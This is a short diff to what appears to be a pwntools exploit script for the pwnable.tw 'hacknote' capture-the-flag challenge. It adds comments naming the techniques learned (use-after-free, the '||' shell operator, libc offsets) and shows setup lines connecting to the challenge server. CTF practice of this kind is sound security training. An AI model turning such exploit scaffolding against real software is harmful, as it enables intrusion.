@@ -1,6 +1,9 @@
 #!/usr/bin/env python
 from pwn import *
 
+#What I learn from this question?
+#uaf,command operator of ||,and libc offset
+
 r = remote("chall.pwnable.tw",10102)
 libc = ELF('libc_32.so.6')
 elf = ELF('./hacknote')
